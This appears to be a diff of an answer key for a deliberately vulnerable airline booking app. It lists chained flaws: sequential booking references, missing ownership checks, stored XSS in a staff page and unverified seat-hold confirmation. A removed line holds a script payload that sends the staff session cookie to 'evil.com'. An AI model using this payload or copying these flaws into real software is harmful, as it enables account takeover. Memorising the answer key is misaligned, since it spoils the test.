@@ -1,18 +1,31 @@
-# Chained Vulnerability Scenarios — Airline Booking
+# Chained Vulnerability Scenarios - Airline Booking
 
-## Chain: "Sequential PNR Enumeration → Booking IDOR → Stored XSS on Staff View"
+## Chain: "Sequential PNR Enumeration -> Booking IDOR -> Stored XSS on Staff View"
 
 | Step | Issue | Severity (standalone) | OWASP | Location |
 |------|-------|-----------------------|-------|----------|
-| 1 | PNRs generated as a sequential integer counter (`BK000001`, `BK000002`, ...) — all valid booking references are trivially enumerable | Low | A04 | `PnrGenerator.java` → `generate()` |
-| 2 | `GET /api/bookings/{pnr}/boarding-summary` performs no ownership check — any authenticated passenger can view any other passenger's booking details | Medium | A01 | `BookingController.java` → `getBoardingSummary()` |
-| 3 | Passenger full name is embedded directly inside an HTML string (`<strong>Passenger:</strong> {name}`) returned by the API — a crafted name containing a script tag executes as XSS when rendered via `innerHTML` on the staff boarding management screen | Medium | A03 | `BookingController.java` → `getBoardingSummary()` |
+| 1 | PNRs are generated as sequential values such as `BK000001` | Low | A04 | `PnrGenerator.java` -> `generate()` |
+| 2 | `GET /api/bookings/{pnr}/boarding-summary` returns booking details without ownership validation | Medium | A01 | `BookingController.java` -> `getBoardingSummary()` |
+| 3 | Passenger display HTML is rendered with `innerHTML` on the staff boarding page | Medium | A03 | `staff-boarding.html` |
 
+**Attack narrative**: The attacker registers with a script payload in their passenger name, enumerates valid PNRs, and waits for staff to load the boarding summary. The staff UI renders the API-provided passenger HTML with `innerHTML`, executing the script.
 
-**Attack narrative**: The attacker books a flight and registers with the name `</strong><script>fetch('https://evil.com/?c='+document.cookie)</script>`. They then enumerate boarding-summary endpoints from `BK000001` upward to find valid PNRs belonging to other passengers (no ownership check). When an airline staff member's browser renders the boarding list via `innerHTML`, the injected script fires and exfiltrates the staff session cookie to the attacker.
-
-**Combined Impact**: Cross-passenger data exfiltration and staff account takeover via Stored XSS.
+**Combined Impact**: Staff account takeover through stored XSS.
 
 ---
 
-_This file is for internal reference. Ground truth vulnerability data is maintained in [.vulns](.vulns)._
+## Chain: "Predictable Seat Hold References -> Hold Ownership Bypass -> Unauthorized Hold Confirmation"
+
+| Step | Issue | Severity (standalone) | OWASP | Location |
+|------|-------|-----------------------|-------|----------|
+| 1 | Seat hold references use predictable values such as `HOLD000101` | Low | A04 | `HoldRefGenerator.java` -> `generate()` |
+| 2 | Hold read and seat-change operations skip ownership checks | Medium | A01 | `SeatHoldService.java` -> `getHoldByRef()` / `changeHeldSeat()` |
+| 3 | Hold confirmation skips owner and payment verification | Medium | A04 | `SeatHoldService.java` -> `confirmHold()` |
+
+**Attack narrative**: The attacker guesses a victim hold reference, reads the hold, changes the held seat, and confirms the hold as their own booking.
+
+**Combined Impact**: Unauthorized seat inventory and booking-record modification.
+
+---
+
+Ground truth vulnerability data is maintained in [.vulns](.vulns).
